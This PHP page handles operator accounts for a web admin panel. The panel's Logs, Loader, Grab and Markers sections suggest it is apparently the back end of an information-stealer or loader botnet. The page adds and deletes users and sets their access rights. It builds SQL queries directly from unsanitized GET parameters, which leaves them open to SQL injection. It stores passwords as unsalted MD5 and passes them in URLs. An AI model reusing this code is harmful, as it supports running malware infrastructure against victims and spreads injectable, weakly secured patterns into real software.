<?php

include_once 'Configs/Main.Config.php';
include_once 'App/Engine.php';

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// rights checker
if($_SESSION["user"]["users"] ? false : true)
{
	header('Location: dashboard.php', true, 301);
	exit();
}


$actions = $_GET["action"];
$UID = $_GET["UID"];

// -------------------------------------------------------------------------
// get params
$users_login 			= $_GET["users_login"];
$users_password 		= $_GET["users_password"];
$users_access_logs 		= $_GET["users_access_logs"];
$users_access_loader 	= $_GET["users_access_loader"];
$users_access_grab 		= $_GET["users_access_grab"];
$users_access_markers 	= $_GET["users_access_markers"];
$users_access_users 	= $_GET["users_access_users"];
$users_access_settings 	= $_GET["users_access_settings"];

switch($actions)
{
	case "add":
		addUser($db, $users_login, $users_password, $users_access_logs, $users_access_loader, $users_access_grab, $users_access_markers, $users_access_users, $users_access_settings);
		break;
	
	case "delete":
		deleteUser($db, $UID);
		break;
		
	case "modal":
		viewUsers($db);
		break;
		
	case "modalChangePassword":
		viewEditPasswordUI($db, $UID);
		break;
		
	default:
		break;
}

// -------------------------------------------------------------------------
// add rule
function addUser($db, $users_login, $users_password, $users_access_logs, $users_access_loader, $users_access_grab, $users_access_markers, $users_access_users, $users_access_settings)
{
	$users_password = md5($users_password);
	
	$db->query("INSERT INTO `users`(`login`, `password`, `dashboard`, `logs`, `loader`, `grab`, `markers`, `users`, `settings`) VALUES ('$users_login','$users_password','1','$users_access_logs','$users_access_loader','$users_access_grab','$users_access_markers','$users_access_users','$users_access_settings')");
	
	echo "success";
	
	exit();
}

// -------------------------------------------------------------------------
// view edit password ui
function viewEditPasswordUI($db, $UID)
{
	$user = $db->query("SELECT * FROM `users` WHERE `id`='$UID'")->fetch_array();
	
?>
<table class="table table-striped">
	<tbody>
		<tr>
			<th scope="row">UID</th>
			<td><? echo $user["id"]; ?></td>
		</tr>
		
		<tr>
			<th scope="row">Login</th>
			<td><? echo $user["login"]; ?></td>
		</tr>
		
		<tr>
			<th scope="row">Change password</th>
			<td><input id="userEdit_newpassword" type="password" class="form-control" placeholder="Enter new password"></td>
		</tr>
		
		<tr>
			<th scope="row">Access Dashboard</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="customCheck4" checked disabled>
					<label class="custom-control-label" for="customCheck4"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Logs</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_logs" <? if($user["logs"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_logs"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Loader</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_loader" <? if($user["loader"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_loader"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Grab</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_grab" <? if($user["grab"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_grab"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Markers</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_markers" <? if($user["markers"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_markers"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Users</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_users" <? if($user["users"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_users"></label>
				</div>
			</td>
		</tr>
		
		<tr>
			<th scope="row">Access Settings</th>
			<td>
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="user_edit_access_settings" <? if($user["settings"] ? true : false){ echo "checked"; } ?>>
					<label class="custom-control-label" for="user_edit_access_settings"></label>
				</div>
			</td>
		</tr>
		
	</tbody>
</table>
<?
	
	exit(0);
}

// -------------------------------------------------------------------------
// view users
function viewUsers($db)
{
	$users = $db->query("SELECT * FROM `users` ORDER BY `id` DESC LIMIT 100;");
	?>
<table class="table">
	<thead>
		<tr>
			<th scope="col">ID</th>
			<th scope="col">Username</th>
			<th scope="col">Rights</th>
			<th scope="col">Actions</th>
		</tr>
	</thead>
	<tbody>
	<? while ($user = $users->fetch_assoc()) { ?>
		<tr>
			<th style="text-align: left;padding-top: 18px;"><? echo $user["id"]; ?></th>
			<td style="text-align: left;padding-top: 18px;"><? echo $user["login"]; ?></td>
			<td style="text-align: left;padding-top: 18px;"><?  
			
			if($user["dashboard"] ? true : false)
			{
				echo "Dashboard";
			}
			
			if($user["logs"] ? true : false)
			{
				echo ", Logs";
			}
			
			if($user["loader"] ? true : false)
			{
				echo ", Loader";
			}
			
			if($user["grab"] ? true : false)
			{
				echo ", Grab";
			}
			
			if($user["markers"] ? true : false)
			{
				echo ", Markers";
			}
			
			if($user["users"] ? true : false)
			{
				echo ", Users";
			}
			
			if($user["settings"] ? true : false)
			{
				echo ", Settings";
			}
			
			?></td>
			<td style="text-align: left;">
				<div class="dropdown">
					<button class="btn btn-secondary dropdown-toggle" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
					<div class="dropdown-menu">
						<a class="dropdown-item" onclick="deleteUser(<? echo $user["id"]; ?>);" style="cursor: pointer;">Delete</a>
					</div>
				</div>
			</td>
		</tr>
	<? } ?>
</tbody>
</table>
	<?

	exit();

}

// -------------------------------------------------------------------------
// delete rule
function deleteUser($db, $UID)
{
	$db->query("DELETE FROM `users` WHERE `id`='$UID'");
	echo "success";
	
	exit();
}


$pageID = "Users";

include_once 'Models/Header.php';

?>
<div class="content content-fixed">
	<div class="container pd-x-0 pd-lg-x-10 pd-xl-x-0">
		<div class="d-sm-flex align-items-center justify-content-between mg-b-20 mg-lg-b-25 mg-xl-b-30">
			<div>
				<h4 class="mg-b-0 tx-spacing--1">Users</h4>
			</div>
			<div class="d-none d-md-block">
				<a onclick="updateRuleList();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase"><i class="fas fa-sync"></i>  Refresh</button>
				</a>
				<a onclick="createRuleUI();" >
					<button class="btn btn-sm pd-x-15 btn-white btn-uppercase mg-l-5"><i class="fas fa-plus"></i>  Add user</button>
				</a>
			</div>
		</div>
		
		<div class="row row-xs">
			<div class="col mg-t-10">
				<div class="card card-dashboard-table">
					<div class="table-responsive">
						<div class="viewTasks"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="createRule" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 60%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Create User</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				
				<form id="createTaskForm" action="loader.php" method="POST">
					<div id="wizard1">
						<h3>General</h3>
						<section>
							<br>
							
							<div class="form-group">
								<label for="grab_ruleName" class="d-block">Login</label>
								<div class="input-group mg-b-10">
									<input type="text" class="form-control" placeholder="Username" id="users_login">
								</div>
							</div>
							
							<div class="form-group">
								<label for="grab_startPath" class="d-block">Password</label>
								<input type="password" class="form-control" placeholder="Secret password" id="users_password">
							</div>
							
						</section>
						
						<h3>Rules</h3>
						<section>
							<br>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="customCheck4" checked disabled>
									<label class="custom-control-label" for="customCheck4">Access Dashboard</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_logs">
									<label class="custom-control-label" for="users_access_logs">Access Logs</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_loader">
									<label class="custom-control-label" for="users_access_loader">Access Loader</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_grab">
									<label class="custom-control-label" for="users_access_grab">Access Grab</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_markers">
									<label class="custom-control-label" for="users_access_markers">Access Markers</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_users">
									<label class="custom-control-label" for="users_access_users">Access Users</label>
								</div>
							</div>
							
							<div class="form-group">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" class="custom-control-input" id="users_access_settings">
									<label class="custom-control-label" for="users_access_settings">Access Settings</label>
								</div>
							</div>
							
						</section>
					</div>
				</form>
				
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="modalInfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 50%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Edit user</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body2">
				
			</div>
			<div class="modal-footer">
				<button type="button" onclick="saveUser();" class="btn btn-success tx-13" data-dismiss="modal">Save</button>
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>

<script>
$('.viewTasks').load("users.php?action=modal");

function saveUser()
{
	var userEdit_newpassword = document.getElementById("userEdit_newpassword").value;
}

function ChangePasswordUI(id)
{
	var rule_url = `users.php?action=modalChangePassword&UID=${id}`;
	
    $('.modal-body2').load(rule_url,function(){
        $('#modalInfo').modal({show:true});
    });
}

function updateRuleList()
{
	$('.viewTasks').load("users.php?action=modal");
	
	new Noty({
		timeout: 3500,
		text: 'Success: users list updated',
		type: 'success',
		layout: 'topRight',
		theme: 'bootstrap-v4',
		progressBar: true
	}).show();
};

function createRuleUI()
{
	$('#createRule').modal({show:true});
};

function createRule()
{
	var users_login = document.getElementById("users_login").value;
	var users_password = document.getElementById("users_password").value;
	var users_access_logs = document.getElementById("users_access_logs");
	var users_access_loader = document.getElementById("users_access_loader");
	var users_access_grab = document.getElementById("users_access_grab");
	var users_access_markers = document.getElementById("users_access_markers");
	var users_access_users = document.getElementById("users_access_users");
	var users_access_settings = document.getElementById("users_access_settings");
	
	if (users_access_logs.checked == true)
	{
		users_access_logs = "1";
	}
	else
	{
		users_access_logs = "0";
	}
	
	if (users_access_loader.checked == true)
	{
		users_access_loader = "1";
	}
	else
	{
		users_access_loader = "0";
	}
	
	if (users_access_grab.checked == true)
	{
		users_access_grab = "1";
	}
	else
	{
		users_access_grab = "0";
	}
	
	if (users_access_markers.checked == true)
	{
		users_access_markers = "1";
	}
	else
	{
		users_access_markers = "0";
	}
	
	if (users_access_users.checked == true)
	{
		users_access_users = "1";
	}
	else
	{
		users_access_users = "0";
	}
	
	if (users_access_settings.checked == true)
	{
		users_access_settings = "1";
	}
	else
	{
		users_access_settings = "0";
	}
	
	
	var xhr = new XMLHttpRequest();
	
	xhr.open('GET', `users.php?action=add&users_login=${users_login}&users_password=${users_password}&users_access_logs=${users_access_logs}&users_access_loader=${users_access_loader}&users_access_loader=${users_access_loader}&users_access_grab=${users_access_grab}&users_access_markers=${users_access_markers}&users_access_users=${users_access_users}&users_access_settings=${users_access_settings}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: user created',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
			$('#createRule').modal('hide');
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: fill rule parameters',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("users.php?action=modal");
	};
	xhr.send(encodeURI('name'));
};

function deleteUser(id)
{
	var xhr = new XMLHttpRequest();

	xhr.open('GET', `users.php?action=delete&UID=${id}`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: user deleted',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		
		$('.viewTasks').load("users.php?action=modal");
	};
	xhr.send(encodeURI('name'));
};

$('#wizard1').steps(
{
	headerTag: 'h3',
	bodyTag: 'section',
	autoFocus: true,
	titleTemplate: '<span class="number">#index#</span> <span class="title">#title#</span>'
});

$('.actions a[href=\\#finish]').attr('onclick', 'createRule();');

$(".numeric").numeric({ decimal : ".",  negative : false, scale: 3 });

</script>

<? include_once 'Models/Footer.php'; ?>

</body>
</html>